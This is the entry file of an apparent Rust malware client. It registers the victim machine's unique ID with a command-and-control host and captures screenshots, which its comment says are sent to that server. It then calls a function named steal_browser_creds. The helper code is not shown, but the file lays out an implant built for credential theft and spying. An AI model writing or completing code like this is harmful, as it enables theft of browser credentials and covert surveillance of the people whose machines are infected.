extern crate machine_uid;

mod constants;
pub mod helpers;
mod utils;

fn main() {
    // Register client with C2 server.
    match utils::register_client(constants::C2_HOST, machine_uid::get().unwrap().as_str()) {
        Ok(_) => println!("\x1b[92mSuccess: Client registered\x1b[0m"),
        Err(e) => println!("\x1b[31mError: {}\x1b[0m", e),
    }

    // Capture screenshot and send to C2 server.
    let _screens = utils::capture_screenshot();
    utils::steal_browser_creds();
}
